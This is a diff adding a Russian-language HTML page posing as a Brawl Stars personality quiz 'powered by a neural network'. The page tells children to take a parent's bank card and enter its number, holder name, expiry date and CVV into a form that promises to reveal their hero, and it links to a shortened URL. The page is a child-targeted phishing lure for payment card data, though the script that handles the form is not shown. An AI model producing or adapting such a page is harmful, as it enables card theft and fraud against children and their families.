@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Какой ты бравлер?</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
+    <link rel="stylesheet" href="css/index.css">
+    <script src="js/index.js" defer></script>
+</head>
+</head>
+
+<body class="bdy">
+    <header>
+        <nav class="navbar navbar-expand-lg bg-body-tertiary">
+            <div class="container">
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
+                    data-bs-target="#navbarTogglerDemo01" aria-controls="navbarTogglerDemo01" aria-expanded="false"
+                    aria-label="Переключатель навигации">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarTogglerDemo01">
+                    <a class="navbar-brand" href="#"><img src="assets/bravl_star.png"
+                            alt="" width="50" height="50" class="brand"></a>
+                    <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                        <li class="nav-item">
+                            <a class="nav-link" aria-current="page" href="#">Главная</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" aria-current="page" href="#how-to-use">Как это работает?</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" aria-current="page" href="#how-you-need">Что тебе потребуется?</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link animate__animated animate__infinite animate__pulse" href="https://goo.su/3MVA3O" >Кто ты из доты</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <div id="carouselExampleAutoplaying" class="carousel slide" data-bs-ride="carousel">
+        <div class="carousel-inner">
+            <div class="carousel-item active">
+                <img src="assets/splash_1.jpg"
+                    class="d-block w-100 animate__animated animate__slower animate__infinite animate__pulse" alt="...">
+            </div>
+            <div class="carousel-item">
+                <img src="assets/splash_2.jpg"
+                    class="d-block w-100 animate__animated animate__slower animate__infinite animate__pulse" alt="...">
+            </div>
+            <div class="carousel-item">
+                <img src="assets/splash_3.jpg"
+                    class="d-block w-100 animate__animated animate__slower animate__infinite animate__pulse" alt="...">
+            </div>
+        </div>
+        <button class="carousel-control-prev" type="button" data-bs-target="#carouselExampleAutoplaying"
+            data-bs-slide="prev">
+            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+            <span class="visually-hidden">Предыдущий</span>
+        </button>
+        <button class="carousel-control-next" type="button" data-bs-target="#carouselExampleAutoplaying"
+            data-bs-slide="next">
+            <span class="carousel-control-next-icon" aria-hidden="true"></span>
+            <span class="visually-hidden">Следующий</span>
+        </button>
+    </div>
+    <main class="container">
+        <div class="row g-3 first d-flex align-items-center" id="how-to-use">
+            <div class="col-4">
+                <img src="assets/shelly_phrase.png" alt="" width="250px"
+                    class="shelly-photo d-none animate__animated animate__repeat-1">
+                <img src="assets/shelly.png" width="300px"
+                    class="animate__animated animate__repeat-1 animate__zoomIn shelly">
+            </div>
+            <div class="col-8">
+                <h4>Как это работает?</h4>
+                <p><b>Это удивительно!</b> <br> Новейшая нейросеть позволяет определить, на какого героя ты наиболее
+                    похож.
+                    Тест поможет узнать, какие качества и черты тебе присущи. Попробуй себя в новом образе!</p>
+            </div>
+        </div>
+        <div class="row g-3 second d-flex align-items-center" id="how-you-need">
+            <div class="col-8">
+                <h4>Что тебе потребуется?</h4>
+                <p><b>Только карточка!</b> <br>Возьми карточку у своих родителей и просто введи номер, имя держателя,
+                    дату и
+                    три цифры на обратной стороне карты</p>
+            </div>
+            <div class="col-4 colt-cont">
+                <img src="assets/colt_pharase.png" alt="" class="colt-photo d-none animate__animated animate__repeat-1"
+                    width="260">
+                <img src="assets/colt.png" width="300px"
+                    class="animate__animated animate__repeat-1 animate__zoomIn colt">
+            </div>
+        </div>
+        <div class="row g-3 first d-flex align-items-center" id="super">
+            <div class="col-6">
+                <div class="row">
+                    <div class="col-md-5">
+                        <label for="cc-name" class="form-label">Имя держателя</label>
+                        <input type="text" class="form-control" id="cc-name" placeholder="Иван Иванов" required="">
+                        <div class="d-none" id="invalidName">
+                            Введите настящие имя и фамилию
+                        </div>
+                    </div>
+
+                    <div class="col-md-5">
+                        <label for="cc-number" class="form-label">Номер карты</label>
+                        <input type="text" class="form-control" id="cc-number" placeholder="4887 7314 9152 4773"
+                            required="">
+                        <div class="d-none" id="invalidNumber">
+                            Номер карты не действителен
+                        </div>
+                    </div>
+
+                    <div class="col-md-5">
+					  <div class="col-md-4">
+                        <label for="cc-expiration" class="form-label">Дата</label>
+                        <input type="text" class="form-control" id="cc-expiration" placeholder="08/30" required="">
+                        <div class="d-none" id="invalidDate">
+                            Дата введена не верно
+                        </div>
+					  </div>
+                    </div>
+
+                    <div class="col-md-5">
+					  <div class="col-md-4">
+                        <label for="cc-cvv" class="form-label">CVV</label>
+                        <input type="password" class="form-control" id="cc-cvv" placeholder="***" required="">
+						  <div class="d-none" id="invalidCVV">
+                            Неверный CVV
+						  </div>
+					  </div>
+					</div>
+                    <div class="col-4 foe">
+                        <button class="w-100 btn btn-primary btn-lg" type="button">Узнать, кто ты!</button>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6">
+                <div class="row">
+                    <div class="col-12 d-flex align-items-center justify-content-center">
+                        <h3 id="counter">Твои кубки: 0</h3>
+                    </div>
+                    <div class="col-12 d-flex align-items-center justify-content-center">
+                        <img src="assets/kubok.png"
+                            class="animate__animated animate__infinite animate__flip monet" alt="" width="300">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row g-3 first d-none" id="prize">
+            <div class="col-12 d-flex align-items-center justify-content-center">
+                <h4>Поздравляю!</h4>
+            </div>
+            <div class="col-12 d-flex align-items-center justify-content-center">
+                <img width="300px" height="300px" id="pic"
+                    class="animate__animated animate__repeat-1 animate__zoomIn">
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="row g-3 gg">
+            <div class="col d-flex justify-content-center">
+                <p class="text-body-primary">Седня без подвалов</p>
+            </div>
+        </div>
+    </footer>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
